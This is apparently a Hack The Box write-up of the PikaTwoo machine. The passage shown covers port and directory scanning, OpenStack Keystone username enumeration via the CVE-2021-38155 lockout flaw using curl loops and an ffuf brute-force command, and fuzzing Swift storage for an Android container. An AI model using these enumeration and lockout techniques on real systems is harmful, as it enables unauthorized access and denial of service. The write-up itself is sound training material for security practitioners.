---
title: HTB: PikaTwoo
url: https://0xdf.gitlab.io/2023/09/09/htb-pikatwoo.html
date: 2023-09-09T13:45:00+00:00
difficulty: Insane [50]
os: Linux
tags: htb-pikatwoo, hackthebox, ctf, nmap, debian, express, feroxbuster, modsecurity, waf, apisix, uri-blocker-apisix, openstack, openstack-swift, openstack-keystone, android, cve-2021-38155, ffuf, apktool, apk, flutter, flutter-obfuscate, genymotion, adb, burp, burp-proxy, burp-repeater, certificate-pinning, frida, sqli, chat-gpt, rsa, cve-2021-43557, bypass, api, swagger, nginx, cve-2021-35368, youtube, nginx-temp-files, kubernetes, minikube, kubectl, podman, cve-2022-24112, cr8escape, cve-2022-0811, crio, kernel-parameters, crashdump, htb-dyplesher, htb-canape, htb-pikaboo, htb-routerspace, htb-encoding, htb-pollution, htb-vessel
---

![PikaTwoo](/img/pikatwoo-cover.png)

PikaTwoo is an absolute monster of an insane box. I’ll start by abusing a vulnerability in OpenStack’s KeyStone to leak a username. With that username, I’ll find an Android application file in the OpenStack Swift object storage. The application is a Flutter application built with the obfuscate option, making it very difficult to reverse. I’ll set up an emulator to proxy the application traffic, using Frida to bypass certificate pinning. I’ll find an SQL injection in the API, and leak an email address. I’ll exploit another vulenrability in the APISIX uri-block WAF to get access to private documents for another API. There, I’ll reset the password for the leaked email, and get authenticated access. I’ll exploit a vulnerability in the modsecurity core rule set to bypass the WAF and get local file include in that API. From there, I’ll abuse nginx temporary files to get a reverse shell in the API pod. I’ll leak an APISIX secret from the Kubernetes secrets store, and use that with another vulnerability to get execution in the APISIX pod. I’ll find creds for a user in a config file and use them to SSH into the host. From there, I’ll abuse the Cr8Escape vulnerability to get execution as root.

## Box Info

| Name | [PikaTwoo](https://hackthebox.com/machines/pikatwoo)  [PikaTwoo](https://hackthebox.com/machines/pikatwoo) [Play on HackTheBox](https://hackthebox.com/machines/pikatwoo) |
| --- | --- |
| Release Date | [04 Feb 2023](https://twitter.com/hackthebox_eu/status/1621176738016362496) |
| Retire Date | 09 Sep 2023 |
| OS | Linux Linux |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for PikaTwoo |
| Radar Graph | Radar chart for PikaTwoo |
| First Blood User | 1 day23:03:04[DrexxKrag DrexxKrag](https://app.hackthebox.com/users/87851) |
| First Blood Root | 2 days02:56:58[Sm1l3z Sm1l3z](https://app.hackthebox.com/users/357237) |
| Creators | [polarbearer polarbearer](https://app.hackthebox.com/users/159204)  [pwnmeow pwnmeow](https://app.hackthebox.com/users/157669) |

## Recon

### nmap

`nmap` finds nine open TCP ports:

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.199
Starting Nmap 7.80 ( https://nmap.org ) at 2023-08-25 14:17 EDT
Nmap scan report for 10.10.11.199
Host is up (0.093s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
4369/tcp  open  epmd
5000/tcp  open  upnp
5672/tcp  open  amqp
8080/tcp  open  http-proxy
25672/tcp open  unknown
35357/tcp open  openstack-id

Nmap done: 1 IP address (1 host up) scanned in 6.97 seconds
oxdf@hacky$ nmap -p 22,80,443,4369,5000,5672,8080,25672,35357 -sCV 10.10.11.199
Starting Nmap 7.80 ( https://nmap.org ) at 2023-08-25 14:19 EDT
WARNING: Service 10.10.11.199:5000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
Nmap scan report for 10.10.11.199
Host is up (0.092s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp    open  http     nginx 1.18.0
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-server-header: nginx/1.18.0
|_http-title: Pikaboo
443/tcp   open  ssl/http nginx 1.18.0
|_http-server-header: APISIX/2.10.1
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=api.pokatmon-app.htb/organizationName=Pokatmon Ltd/stateOrProvinceName=United Kingdom/countryName=UK
| Not valid before: 2021-12-29T20:33:08
|_Not valid after:  3021-05-01T20:33:08
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|_  http/1.1
4369/tcp  open  epmd     Erlang Port Mapper Daemon
| epmd-info:
|   epmd_port: 4369
|   nodes:
|_    rabbit: 25672
5000/tcp  open  rtsp
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 NOT FOUND
|     Content-Type: text/html; charset=utf-8
|     Vary: X-Auth-Token
|     x-openstack-request-id: req-ae49910b-c07a-4867-a7ee-df8fb9c5c917
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest:
|     HTTP/1.0 300 MULTIPLE CHOICES
|     Content-Type: application/json
|     Location: http://pikatwoo.pokatmon.htb:5000/v3/
|     Vary: X-Auth-Token
|     x-openstack-request-id: req-6006b017-fafe-49d5-929f-1c5fed46af10
|     {"versions": {"values": [{"id": "v3.14", "status": "stable", "updated": "2020-04-07T00:00:00Z", "links": [{"rel": "self", "href": "http://pikatwoo.pokatmon.htb:5000/v3/"}], "media-types": [{"base": "application/json", "type": "application/vnd.openstack.identity-v3+json"}]}]}}
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|     Vary: X-Auth-Token
|     x-openstack-request-id: req-4598481e-9b91-4d33-b068-91ec53a0c4c0
|   RTSPRequest:
|     RTSP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|     Vary: X-Auth-Token
|     x-openstack-request-id: req-33cedcbb-e43d-4a7e-b8c4-021909730672
|   SIPOptions:
|_    SIP/2.0 200 OK
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
5672/tcp  open  amqp     RabbitMQ 3.8.9 (0-9)
| amqp-info:
|   capabilities:
|     publisher_confirms: YES
|     exchange_exchange_bindings: YES
|     basic.nack: YES
|     consumer_cancel_notify: YES
|     connection.blocked: YES
|     consumer_priorities: YES
|     authentication_failure_close: YES
|     per_consumer_qos: YES
|     direct_reply_to: YES
|   cluster_name: rabbit@pikatwoo.pokatmon.htb
|   copyright: Copyright (c) 2007-2020 VMware, Inc. or its affiliates.
|   information: Licensed under the MPL 2.0. Website: https://rabbitmq.com
|   platform: Erlang/OTP 23.2.6
|   product: RabbitMQ
|   version: 3.8.9
|   mechanisms: AMQPLAIN PLAIN
|_  locales: en_US
8080/tcp  open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
25672/tcp open  unknown
35357/tcp open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-title: Site doesn't have a title (application/json).
|_Requested resource was http://10.10.11.199:35357/v3/
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.80%I=7%D=8/25%Time=64E8F0C4%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,1DC,"HTTP/1\.0\x20300\x20MULTIPLE\x20CHOICES\r\nContent-Type:\
SF:x20application/json\r\nLocation:\x20http://pikatwoo\.pokatmon\.htb:5000
SF:/v3/\r\nVary:\x20X-Auth-Token\r\nx-openstack-request-id:\x20req-6006b01
SF:7-fafe-49d5-929f-1c5fed46af10\r\n\r\n{\"versions\":\x20{\"values\":\x20
SF:\[{\"id\":\x20\"v3\.14\",\x20\"status\":\x20\"stable\",\x20\"updated\":
SF:\x20\"2020-04-07T00:00:00Z\",\x20\"links\":\x20\[{\"rel\":\x20\"self\",
SF:\x20\"href\":\x20\"http://pikatwoo\.pokatmon\.htb:5000/v3/\"}\],\x20\"m
SF:edia-types\":\x20\[{\"base\":\x20\"application/json\",\x20\"type\":\x20
SF:\"application/vnd\.openstack\.identity-v3\+json\"}\]}\]}}")%r(RTSPReque
SF:st,AC,"RTSP/1\.0\x20200\x20OK\r\nContent-Type:\x20text/html;\x20charset
SF:=utf-8\r\nAllow:\x20GET,\x20OPTIONS,\x20HEAD\r\nVary:\x20X-Auth-Token\r
SF:\nx-openstack-request-id:\x20req-33cedcbb-e43d-4a7e-b8c4-021909730672\r
SF:\n\r\n")%r(HTTPOptions,AC,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20t
SF:ext/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20OPTIONS,\x20HEAD\r\nVar
SF:y:\x20X-Auth-Token\r\nx-openstack-request-id:\x20req-4598481e-9b91-4d33
SF:-b068-91ec53a0c4c0\r\n\r\n")%r(FourOhFourRequest,180,"HTTP/1\.0\x20404\
SF:x20NOT\x20FOUND\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nVary
SF::\x20X-Auth-Token\r\nx-openstack-request-id:\x20req-ae49910b-c07a-4867-
SF:a7ee-df8fb9c5c917\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x
SF:20HTML\x203\.2\x20Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1
SF:>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x
SF:20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manual
SF:ly\x20please\x20check\x20your\x20spelling\x20and\x20try\x20again\.</p>\
SF:n")%r(SIPOptions,12,"SIP/2\.0\x20200\x20OK\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 145.99 seconds

```

Based on the [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) version, the host is likely running Debian 11 bullseye.

these scan results show:
- SSH on TCP 22.
- nginx web servers on TCP 80, 443, 8080, and 35357.
- RabbitMQ-related ports, including the Erlang Port Mapper on TCP 4369, RabbitMQ on TCP 5672, and likely whatever is running on 25672. I looked at this a bit [Dyplesher](/2020/10/24/htb-dyplesher.html#analysis) a long time ago and in [Canape](/2018/09/15/htb-canape.html#execution-through-empd) even longer ago.
- Something that could be SIP/VoIP-related based on the `nmap` results on TCP 5000, but that ends up being another HTTP API.

I’ll note the TLS certificate name on TCP 443 is `api.pokatmon-app.htb`. I’ll add this to my `/etc/hosts` file. I’ll look for any kind of virtual host routing and additional subdomains for each HTTP server, but it doesn’t seem to change anything.

### HTTP - TCP 80

#### Site

The site is the “Pokadex” site from [Pikaboo](/2021/12/04/htb-pikaboo.html#website---tcp-80):

![image-20230825144945170](/img/image-20230825144945170.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

Interestingly, while on Pikaboo, clicking on one of the monsters gave a message about the API integration coming soon, this time it leads to a 404 response:

![image-20230825144755071](/img/image-20230825144755071.png)

That is a JSON response that Firefox is displaying in a pretty manner:

```

{
    "success":"false",
    "message":"Page not found",
    "error": {
        "statusCode":404,
        "message":"You reached a route that is not defined on this server"
    }
}

```

The link to “Docs” goes to `/docs` which returns a redirect to `/docs/` which redirects to `/login`:

![image-20230825145038499](/img/image-20230825145038499.png)

#### Tech Stack

The HTTP headers show nginx sitting in front of the Express NodeJS framework:

```

HTTP/1.1 304 Not Modified
Server: nginx/1.18.0
Date: Fri, 25 Aug 2023 18:42:46 GMT
Connection: close
X-Powered-By: Express
Access-Control-Allow-Origin: *
ETag: W/"23db-/4eVHjFc3YM0K1mD1HbO0F28wn4"

```

That 404 response is the default response for NodeJS, which fits Express:

![image-20230825145450134](/img/image-20230825145450134.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.199

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.199
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l       13w      140c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      184l      616w     9179c http://10.10.11.199/
301      GET       10l       16w      179c http://10.10.11.199/images => http://10.10.11.199/images/
200      GET      114l      196w     3340c http://10.10.11.199/login
301      GET       10l       16w      175c http://10.10.11.199/docs => http://10.10.11.199/docs/
200      GET      114l      196w     3340c http://10.10.11.199/Login
302      GET        1l        4w       28c http://10.10.11.199/welcome => http://10.10.11.199/login
301      GET       10l       16w      175c http://10.10.11.199/Docs => http://10.10.11.199/Docs/
301      GET       10l       16w      181c http://10.10.11.199/artwork => http://10.10.11.199/artwork/
200      GET       83l      143w     2371c http://10.10.11.199/forgot
200      GET       15l       32w      292c http://10.10.11.199/CHANGELOG
200      GET      202l     1581w    11358c http://10.10.11.199/docs/LICENSE
301      GET       10l       16w      175c http://10.10.11.199/DOCS => http://10.10.11.199/DOCS/
200      GET      202l     1581w    11358c http://10.10.11.199/Docs/LICENSE
200      GET      202l     1581w    11358c http://10.10.11.199/DOCS/LICENSE
200      GET      114l      196w     3340c http://10.10.11.199/LOGIN
302      GET        1l        4w       28c http://10.10.11.199/Welcome => http://10.10.11.199/login
403      GET        1l        3w       21c http://10.10.11.199/password-reset
[####################] - 6m    180000/180000  0s      found:17      errors:0
[####################] - 5m     30000/30000   86/s    http://10.10.11.199/
[####################] - 5m     30000/30000   85/s    http://10.10.11.199/images/
[####################] - 6m     30000/30000   76/s    http://10.10.11.199/docs/
[####################] - 6m     30000/30000   76/s    http://10.10.11.199/Docs/
[####################] - 5m     30000/30000   84/s    http://10.10.11.199/artwork/
[####################] - 5m     30000/30000   85/s    http://10.10.11.199/DOCS/

```

There’s not much new here except for `/CHANGELOG`. It shows some hints about what is to come:

```

oxdf@hacky$ curl http://10.10.11.199/CHANGELOG
PokatMon v1.0.2
==============================
- PokatMon Android App Beta1 released
- New Authentication API
- Web Server hardening with ModSecurity

PokatMon v1.0.1
==============================
- New Authentication API

PokatMon v1.0.0
==============================
- Initial release

```

I’ll keep an eye out for an Android app and an authentication API, as well as the Modsecurity web application firewall (WAF).

### HTTPS - TCP 443

#### Site

This page just returns a 404 message at the root:

![image-20230825150722270](/img/image-20230825150722270.png)

#### Tech Stack

The HTTP response header have a different Server header here:

```

HTTP/1.1 404 Not Found
Date: Fri, 25 Aug 2023 19:05:56 GMT
Content-Type: text/plain; charset=utf-8
Connection: close
Server: APISIX/2.10.1
Content-Length: 36

{"error_msg":"404 Route Not Found"}

```

[APISIX](https://apisix.apache.org/) is an API Gateway that can help with things like load balancing. Searching for the 404 string also finds APISIX-related results:

![image-20230825151615590](/img/image-20230825151615590.png)

I’ll also note the version of APISIX, 2.10.1. There are several vulnerabilities in this version, which I’ll come back to later.

#### Directory Brute Force

`feroxbuster` shows that anything with the string “private” in it returns 403:

```

oxdf@hacky$ feroxbuster -u https://10.10.11.199 -k

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://10.10.11.199
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        4w       36c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        1l        4w       38c https://10.10.11.199/_private
403      GET        1l        4w       38c https://10.10.11.199/private
403      GET        1l        4w       38c https://10.10.11.199/download_private
403      GET        1l        4w       38c https://10.10.11.199/privatemsg
403      GET        1l        4w       38c https://10.10.11.199/privateassets
403      GET        1l        4w       38c https://10.10.11.199/privatedir
403      GET        1l        4w       38c https://10.10.11.199/privatefolder
403      GET        1l        4w       38c https://10.10.11.199/toolsprivate
403      GET        1l        4w       38c https://10.10.11.199/private-cgi-bin
403      GET        1l        4w       38c https://10.10.11.199/private2
403      GET        1l        4w       38c https://10.10.11.199/private_messages
403      GET        1l        4w       38c https://10.10.11.199/_vti_private
403      GET        1l        4w       38c https://10.10.11.199/private_files
403      GET        1l        4w       38c https://10.10.11.199/privatedata
403      GET        1l        4w       38c https://10.10.11.199/privatemessages
403      GET        1l        4w       38c https://10.10.11.199/private1
403      GET        1l        4w       38c https://10.10.11.199/privatearea
403      GET        1l        4w       38c https://10.10.11.199/privatedirectory
403      GET        1l        4w       38c https://10.10.11.199/privatefiles
403      GET        1l        4w       38c https://10.10.11.199/private_html
403      GET        1l        4w       38c https://10.10.11.199/privates
403      GET        1l        4w       38c https://10.10.11.199/privateimages
[####################] - 1m     30000/30000   0s      found:22      errors:0
[####################] - 1m     30000/30000   483/s   https://10.10.11.199/

```

At first I thought that was nginx or modsecurity, but looking at the raw response shows something different:

```

oxdf@hacky$ curl -k https://10.10.11.199/private
{"error_msg":"access is not allowed"}

```

That message is associated with the `uri-blocker` plugin for APISIX:

![image-20230829161712850](/img/image-20230829161712850.png)

### swift - TCP 8080

#### Site

This page also returns a 404 message, though a different one:

![image-20230825151232578](/img/image-20230825151232578.png)

#### Tech Stack

The HTTP response headers show the nginx server, but also include `X-Trans-Id` and `X-Openstack-Request-Id` headers:

```

HTTP/1.1 404 Not Found
Server: nginx/1.18.0
Date: Fri, 25 Aug 2023 19:12:24 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Trans-Id: txfbad09c2db7c4b3ab4724-0064e8fd18
X-Openstack-Request-Id: txfbad09c2db7c4b3ab4724-0064e8fd18
Content-Length: 70

```

[OpenStack](https://www.openstack.org/) is open-source cloud software that simulates things like AWS. According to the [OpenStack default ports documentation](https://docs.openstack.org/install-guide/firewalls-default-ports.html), 8080 typically hosts the OpenStack Object Storage service, swift.

The [documentation for swift](https://docs.openstack.org/api-ref/object-store/) shows a few endpoints to check. `/info` does return information that shows this is swift version 2.27.0:

```

oxdf@hacky$ curl -s http://10.10.11.199:8080/info | jq .
{
  "swift": {
    "version": "2.27.0",
    "strict_cors_mode": true,
    "policies": [
      {
        "name": "Policy-0",
        "aliases": "Policy-0",
        "default": true
      }
    ],
    "allow_account_management": true,
    "account_autocreate": true,
    "max_file_size": 5368709122,
    "max_meta_name_length": 128,
    "max_meta_value_length": 256,
    "max_meta_count": 90,
    "max_meta_overall_size": 4096,
    "max_header_size": 8192,
    "max_object_name_length": 1024,
    "container_listing_limit": 10000,
    "account_listing_limit": 10000,
    "max_account_name_length": 256,
    "max_container_name_length": 256,
    "extra_header_count": 0
  },
  "s3api": {
    "max_bucket_listing": 1000,
    "max_parts_listing": 1000,
    "max_upload_part_num": 1000,
    "max_multi_delete_objects": 1000,
    "allow_multipart_uploads": true,
    "min_segment_size": 5242880,
    "s3_acl": false
  },
  "bulk_upload": {
    "max_containers_per_extraction": 10000,
    "max_failed_extractions": 1000
  },
  "bulk_delete": {
    "max_deletes_per_request": 10000,
    "max_failed_deletes": 1000
  },
  "tempurl": {
    "methods": [
      "GET",
      "HEAD",
      "PUT",
      "POST",
      "DELETE"
    ],
    "incoming_remove_headers": [
      "x-timestamp"
    ],
    "incoming_allow_headers": [],
    "outgoing_remove_headers": [
      "x-object-meta-*"
    ],
    "outgoing_allow_headers": [
      "x-object-meta-public-*"
    ],
    "allowed_digests": [
      "sha1",
      "sha256",
      "sha512"
    ]
  },
  "tempauth": {
    "account_acls": true
  },
  "slo": {
    "max_manifest_segments": 1000,
    "max_manifest_size": 8388608,
    "yield_frequency": 10,
    "min_segment_size": 1,
    "allow_async_delete": false
  },
  "versioned_writes": {
    "allowed_flags": [
      "x-versions-location",
      "x-history-location"
    ]
  },
  "object_versioning": {},
  "symlink": {
    "symloop_max": 2,
    "static_links": true
  }
}

```

The next API to look at is `/v1/{account}` and then `/v1/{account}/{container}`. Unfortunately, I don’t know any accounts a this time. Looking at both `/v1/admin` (which may or may not exist) and `/v1/0xdf` (that I don’t expect to exist), they both return the same 401 Unauthorized response. Running `ffuf` to try other names doesn’t find anything.

The rest of the endpoints require an account name. I do note that the docs show using a `X-Auth-Token: {token}` header to access these endpoints. I don’t have a token at this time.

### keystone - TCP 5000 / 35357

Visiting either port 5000 or 35357 returns the same JSON:

```

oxdf@hacky$ curl http://10.10.11.199:5000/ -s | jq .
{
  "versions": {
    "values": [
      {
        "id": "v3.14",
        "status": "stable",
        "updated": "2020-04-07T00:00:00Z",
        "links": [
          {
            "rel": "self",
            "href": "http://10.10.11.199:5000/v3/"
          }
        ],
        "media-types": [
          {
            "base": "application/json",
            "type": "application/vnd.openstack.identity-v3+json"
          }
        ]
      }
    ]
  }
}

```

Searching for the string “openstack.identity-v3+json” returns results for the keystone identity service:

The [same OpenStack ports list](https://docs.openstack.org/install-guide/firewalls-default-ports.html) shows that port 5000 is the default for keystone.

## Get Android Application

### Identify Username

#### Identify CVE

In looking for information about keystone and potential vulnerabilities, I’ll find CVE-2021-38155, which is easy to miss as it’s listed as both an information disclosure vulnerability and a denial of service vulnerability. By guessing an account name and failing auth until it locks out, keystone will respond differently if the account exists or not. [This bug post on launchpad](https://bugs.launchpad.net/keystone/+bug/1688137) shows how this could work.

This feature, `lockout_faulure_attempts`, according to [the docs](https://docs.openstack.org/keystone/queens/_modules/keystone/conf/security_compliance.html), is disabled by default. I don’t really have a way to figure out what the number of attempts required or if this is even enabled other other than to try.

#### Test POC

I’ll start with a POST request to `/v3/auth/tokens`, copying the body from the link above, and looking at what happens with a username I expect not to exist. I’ll use a `bash` loop to send the request ten times:

```

oxdf@hacky$ for i in {1..10}; do echo -n $i; curl -d '{ "auth": {
>     "identity": {
>       "methods": ["password"],
>       "password": {
>         "user": {
>           "name": "0xdf",
>           "domain": { "id": "default" },
>           "password": "fake_password"
>         }
>       }
>     }
>   }
> }' -H "Content-Type: application/json" http://10.10.11.199:5000/v3/auth/tokens; done
1{"error":{"code":401,"message":"The request you have made requires authentication.","title":"Unauthorized"}}
2{"error":{"code":401,"message":"The request you have made requires authentication.","title":"Unauthorized"}}
3{"error":{"code":401,"message":"The request you have made requires authentication.","title":"Unauthorized"}}
4{"error":{"code":401,"message":"The request you have made requires authentication.","title":"Unauthorized"}}
5{"error":{"code":401,"message":"The request you have made requires authentication.","title":"Unauthorized"}}
6{"error":{"code":401,"message":"The request you have made requires authentication.","title":"Unauthorized"}}
7{"error":{"code":401,"message":"The request you have made requires authentication.","title":"Unauthorized"}}
8{"error":{"code":401,"message":"The request you have made requires authentication.","title":"Unauthorized"}}
9{"error":{"code":401,"message":"The request you have made requires authentication.","title":"Unauthorized"}}
10{"error":{"code":401,"message":"The request you have made requires authentication.","title":"Unauthorized"}}

```

It just returns the same thing over and over.

I’m going to start with a guess that an admin account might exist. If this doesn’t work, I won’t know if that’s because it’s not configured to do lockout, or if it’s because admin user doesn’t exist. But if it does work, I’ll have proved admin is an account and that this technique works. It works:

```

oxdf@hacky$ for i in {1..10}; do echo -n $i; curl -d '{ "auth": {
>     "identity": {
>       "methods": ["password"],
>       "password": {
>         "user": {
>           "name": "admin",
>           "domain": { "id": "default" },
>           "password": "fake_password"
>         }
>       }
>     }
>   }
> }' -H "Content-Type: application/json" http://10.10.11.199:5000/v3/auth/tokens; done
1{"error":{"code":401,"message":"The request you have made requires authentication.","title":"Unauthorized"}}
2{"error":{"code":401,"message":"The request you have made requires authentication.","title":"Unauthorized"}}
3{"error":{"code":401,"message":"The request you have made requires authentication.","title":"Unauthorized"}}
4{"error":{"code":401,"message":"The request you have made requires authentication.","title":"Unauthorized"}}
5{"error":{"code":401,"message":"The request you have made requires authentication.","title":"Unauthorized"}}
6{"error":{"code":401,"message":"The account is locked for user: 01b5b2fb7f1547f282dc1c62ff0087e1.","title":"Unauthorized"}}
7{"error":{"code":401,"message":"The account is locked for user: 01b5b2fb7f1547f282dc1c62ff0087e1.","title":"Unauthorized"}}
8{"error":{"code":401,"message":"The request you have made requires authentication.","title":"Unauthorized"}}
9{"error":{"code":401,"message":"The request you have made requires authentication.","title":"Unauthorized"}}
10{"error":{"code":401,"message":"The request you have made requires authentication.","title":"Unauthorized"}}

```

At requests 6 and 7 it shows a different message, saying that the account is locked with a userid.

#### Bruteforce Users

I don’t really need this exploit to guess there’s an admin user. I want to look for other users. The most efficient way I know to do this is with `ffuf`, giving it two wordlists (as described [here](https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html#fuzzing-multiple-locations)). The first list will be just the numbers 1-10. This is just to make sure it does each name 10 times. The second list is the list of names to fuzz. I’ll pass both lists, with the numbers as `F1` and the names as `F2`. I’ll use `F2` in the name field, and I’ll include `F1` in the wrong password just so that it’s used.

It finds another name after about four minutes, andrew:

```

oxdf@hacky$ ffuf -u http://10.10.11.199:5000/v3/auth/tokens -X POST -H "Content-type: application/json" -w ./tenlines.txt:F1,/opt/SecLists/Usernames/Names/names.txt:F2 -d '{ "auth": {"identity": {"methods": ["password"], "password": {"user": { "name": "F2","domain": { "id": "default" },"password": "fake_passwordF1" } } } } }' -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.11.199:5000/v3/auth/tokens
 :: Wordlist         : F1: /home/oxdf/hackthebox/pikatwoo-10.10.11.199/tenlines.txt
 :: Wordlist         : F2: /opt/SecLists/Usernames/Names/names.txt
 :: Header           : Content-Type: application/json
 :: Data             : { "auth": {"identity": {"methods": ["password"], "password": {"user": { "name": "F2","domain": { "id": "default" },"password": "fake_passwordF1" } } } } }
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5274ms]
    * F1: 8
    * F2: admin

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5320ms]
    * F1: 4
    * F2: admin

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5366ms]
    * F1: 10
    * F2: admin

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5812ms]
    * F1: 10
    * F2: andrew

[Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5955ms]
    * F1: 9
    * F2: andrew

:: Progress: [101770/101770] :: Job [1/1] :: 24 req/sec :: Duration: [1:45:35] :: Errors: 0 ::

```

Each username shows up a few times because somethings the locked message comes more than once. I’ll leave the fuzz going in the background (it’ll take over an hour and a half), but it won’t find any others.

### keystone <-> swift

#### Background

The [docs for swift](https://docs.openstack.org/swift/latest/overview_auth.html) show different ways to configure authentication, and one of the methods is keystone. With this setup, an end user can use a prefix (by default `AUTH_`) to their account name to get authentication in the background.

#### Fuzz

Trying manually for both admin and andrew doesn’t look promising:

```

oxdf@hacky$ curl http://10.10.11.199:8080/v1/AUTH_admin
<html><h1>Unauthorized</h1><p>This server could not verify that you are authorized to access the document you requested.</p></html>
oxdf@hacky$ curl http://10.10.11.199:8080/v1/AUTH_andrew
<html><h1>Unauthorized</h1><p>This server could not verify that you are authorized to access the document you requested.</p></html>

```

Still, I’ll look for containers with `ffuf`, starting with andrew (as it was more difficult to find and not just guess):

```

oxdf@hacky$ ffuf -u http://10.10.11.199:8080/v1/AUTH_andrew/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-medium-words.txt -mc all -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.199:8080/v1/AUTH_andrew/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-medium-words.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

android                 [Status: 200, Size: 17, Words: 1, Lines: 2, Duration: 862ms]
:: Progress: [63087/63087] :: Job [1/1] :: 21 req/sec :: Duration: [0:51:11] :: Errors: 0 ::

```

After a couple minutes, it finds `android`. It runs for a long time after that, but `android` is all that is needed.

#### Get APK

I’ll hit that endpoint, and it returns the name of a file:

```

